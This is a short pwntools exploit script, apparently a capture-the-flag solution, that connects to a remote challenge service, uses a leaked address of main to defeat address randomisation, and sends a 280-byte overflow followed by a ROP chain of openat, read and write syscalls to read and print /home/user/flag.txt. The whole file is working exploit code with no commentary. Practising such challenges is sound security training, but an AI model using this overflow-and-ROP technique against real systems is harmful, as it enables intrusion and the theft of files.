from pwn import *
elf = context.binary = ELF("./chal")
p = process()
p = remote("drywall.kctf-453514-codelab.kctf.cloud",1337)
offset = 280
p.sendline("/home/user/flag.txt\x00")
p.recvuntil(b"<|;)\n")
leak_main = int(p.recvline().strip().decode(),16)
elf.address = leak_main - elf.sym['main']
s_ret = elf.address + 0x000000000000119d
log.info(f"main {hex(elf.address)}")
rop = ROP(elf)
rop.raw(b"A" * offset)
name = elf.sym['_ZL4name']
def openatt():
    rop.rax = 257
    rop.rdi = -1
    rop.rsi = name
    rop.rdx = 0
    rop.raw(s_ret)

def readS():
    rop.rax = constants.SYS_read
    rop.rdi = 3
    rop.rsi = name + 24
    rop.rdx = 0xff
    rop.raw(s_ret)

def writeS():
    rop.rax = constants.SYS_write
    rop.rdi = 1
    rop.rsi = name
    rop.rdx = 0xff
    rop.raw(s_ret)
openatt()
readS()
writeS()
# time.sleep(20)
p.sendline(rop.chain())
write("payload",rop.chain())
p.interactive()
